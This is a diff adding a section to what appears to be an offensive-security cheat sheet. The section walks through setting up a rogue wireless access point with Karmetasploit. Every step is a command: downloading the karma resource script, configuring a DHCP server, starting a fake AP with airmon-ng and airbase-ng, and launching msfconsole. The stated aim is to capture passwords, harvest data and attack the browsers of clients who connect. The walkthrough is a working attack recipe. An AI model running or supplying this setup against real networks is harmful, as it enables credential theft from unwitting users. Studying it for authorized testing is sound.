@@ -486,3 +486,55 @@ imf: email contents
 smb: Windows network share file
 tftp: Unsecured file
 ```
+
+## Rogue APs with Karmetasploit:
+
+Karmetasploit is a great function within Metasploit, allowing you to fake access points, capture passwords, harvest data, and conduct browser attacks against clients.
+
+Install Karmetasploit configuration:
+
+```
+root@RoseSecurity:~# wget https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt
+root@RoseSecurity:~# apt update
+```
+
+Install and configure sqlite and DHCP server:
+
+```
+root@RoseSecurity:~# apt -y install isc-dhcp-server
+root@RoseSecurity:~# vim /etc/dhcp/dhcpd.conf
+root@RoseSecurity:~# apt -y install libsqlite3-dev
+root@RoseSecurity:~# gem install activerecord sqlite3
+```
+
+Now we are ready to go. First off, we need to locate our wireless card, then start our wireless adapter in monitor mode with airmon-ng. Afterwards we use airbase-ng to start a new wireless network.
+
+```
+# Locate interface
+root@RoseSecurity:~# airmon-ng
+
+# Start monitoring
+root@RoseSecurity:~# airmon-ng start wlan0
+
+# Start AP
+root@RoseSecurity:~# airbase-ng -P -C 30 -e "Fake AP" -v wlan0mon
+
+# Assign IP to interface
+root@RoseSecurity:~# ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
+```
+
+Before we run our DHCP server, we need to create a lease database, then we can get it to listening on our new interface.
+
+```
+root@RoseSecurity:~# touch /var/lib/dhcp/dhcpd.leases
+root@RoseSecurity:~# dhcpd -cf /etc/dhcp/dhcpd.conf at0
+```
+
+Run Karmetasploit:
+
+```
+root@RoseSecurity:~# msfconsole -q -r karma.rc_.txt
+```
+
+At this point, we are up and running. All that is required now is for a client to connect to the fake access point. When they connect, they will see a fake ‘captive portal’ style screen regardless of what website they try to connect to. You can look through your output, and see that a wide number of different servers are started. From DNS, POP3, IMAP, to various HTTP servers, we have a wide net now cast to capture various bits of information.
+
